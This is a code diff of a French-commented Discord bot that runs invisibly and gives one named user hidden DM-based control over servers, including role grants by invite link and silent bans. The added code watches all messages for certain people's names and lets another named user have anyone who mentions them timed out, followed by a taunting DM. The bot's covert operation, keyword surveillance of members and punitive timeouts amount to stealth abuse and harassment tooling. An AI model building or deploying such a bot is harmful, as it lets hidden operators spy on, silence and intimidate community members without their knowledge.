@@ -1,5 +1,7 @@
 import discord
 from discord.ext import commands
+import os
+import datetime
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -9,6 +11,11 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 # Ton pseudo exact pour sécuriser les commandes
 TARGET_USERNAME = "akz_92"
+VICTIME_NAME = "m1zuki_1"
+MOTS_CLES = ["cozmo", "ilan", "youngzoomer", "@m1zuki_1"]
+
+# Stockage temporaire pour les demandes de timeout
+pending_timeouts = {}
 
 # Fonction utilitaire pour récupérer un serveur soit par son ID, soit par un lien/code d'invitation
 async def get_guild_from_input(identifier):
@@ -25,7 +32,7 @@ async def get_guild_from_input(identifier):
 async def on_ready():
     # Force le statut en mode invisible (hors-ligne) dès que le bot est prêt
     await bot.change_presence(status=discord.Status.invisible)
-    print(f"Bot furtif opérationnel et invisible pour : {TARGET_USERNAME}")
+    print(f"Bot furtif opérationnel et invisible pour : {TARGET_USERNAME}. Surveillance active pour {VICTIME_NAME}.")
 
 # =========================================================================
 # AUTO-ROLE : Ajoute automatiquement le rôle "Membre" à akz_92
@@ -46,7 +53,47 @@ async def on_message(message):
         return
 
     # =========================================================================
-    # 1. GESTION DES DM (Contrôle à distance 100% discret)
+    # 0. SYSTEME DE SURVEILLANCE & CIBLE VERROUILLÉE (pour m1zuki_1)
+    # =========================================================================
+    if any(mot.lower() in message.content.lower() for mot in MOTS_CLES) and message.author.name != VICTIME_NAME:
+        victime = discord.utils.get(message.guild.members, name=VICTIME_NAME)
+        if victime:
+            pending_timeouts[message.author.id] = message.author
+            try:
+                await victime.send(
+                    f"🚨 **Cible verrouillée** 🚨\n"
+                    f"L'utilisateur '{message.author.name}' a dis votre prénom.\n"
+                    f"Voulez-vous l'exterminer (timeout 10min) ? Répondez **oui** ou **non**."
+                )
+            except:
+                pass
+
+    # Réponses de m1zuki_1 en DM pour valider ou non le timeout (strictement limité à m1zuki_1)
+    if isinstance(message.channel, discord.DMChannel) and message.author.name == VICTIME_NAME:
+        content = message.content.lower().strip()
+        if content in ["oui", "non"]:
+            if pending_timeouts:
+                user_id = list(pending_timeouts.keys())[0]
+                target = pending_timeouts[user_id]
+                
+                if content == "oui":
+                    try:
+                        duration = datetime.timedelta(minutes=10)
+                        await target.timeout(duration, reason="Punition m1zuki_1")
+                        await target.send(f"Tu dis mon prénom ? Explique toi maintenant ! @{message.author.name}")
+                        await message.author.send(f"✅ L'utilisateur {target.name} a pris un timeout de 10 min.")
+                    except Exception as e:
+                        await message.author.send(f"❌ Impossible de timeout cette personne : {e}")
+                else:
+                    await message.author.send("✅ Action annulée.")
+                
+                pending_timeouts.pop(user_id)
+            else:
+                await message.author.send("Aucune cible en attente.")
+            return
+
+    # =========================================================================
+    # 1. GESTION DES DM (Contrôle à distance 100% discret strictement pour akz_92)
     # =========================================================================
     if isinstance(message.channel, discord.DMChannel):
         if message.author.name != TARGET_USERNAME:
@@ -126,7 +173,6 @@ async def on_message(message):
                 await message.author.send(f"✅ Rôle {role.name} créé.")
 
             elif cmd == "puissance":
-                # Usage: !puissance <ID_ou_lien_serveur> <ID_ou_nom_utilisateur>
                 guild = await get_guild_from_input(args[1])
                 if not guild:
                     await message.author.send("❌ Serveur introuvable ou invitation invalide.")
@@ -134,15 +180,11 @@ async def on_message(message):
                 
                 target_input = args[2]
                 member = None
-
-                # Si l'utilisateur a entré un ID
                 if target_input.isdigit():
                     try:
                         member = await guild.fetch_member(int(target_input))
                     except:
                         pass
-                
-                # Sinon, on cherche par son nom ou son pseudo
                 if not member:
                     member = discord.utils.find(lambda m: m.name == target_input or m.display_name == target_input, guild.members)
 
@@ -150,7 +192,6 @@ async def on_message(message):
                     await message.author.send(f"❌ Impossible de trouver l'utilisateur '{target_input}' sur ce serveur.")
                     return
 
-                # Recherche du rôle "La puissance"
                 role = discord.utils.get(guild.roles, name="La puissance")
                 if not role:
                     await message.author.send("❌ Le rôle 'La puissance' n'existe pas sur ce serveur.")
@@ -200,7 +241,7 @@ async def on_message(message):
         return
 
     # =========================================================================
-    # 2. COMMANDE .ban SUR LE SERVEUR (100% Silencieuse / Aucun MP envoyé)
+    # 2. COMMANDE .ban SUR LE SERVEUR (100% Silencieuse / Réservée à akz_92)
     # =========================================================================
     if message.content.startswith(".ban"):
         if message.author.name == TARGET_USERNAME:
@@ -221,5 +262,5 @@ async def on_message(message):
                     except:
                         pass
 
-# REMPLACE PAR TON TOKEN ICI
-bot.run(os.getenv("TOKEN")).
+# Lancement sécurisé via la variable d'environnement (Token géré sur l'hébergeur)
+bot.run(os.getenv("TOKEN"))
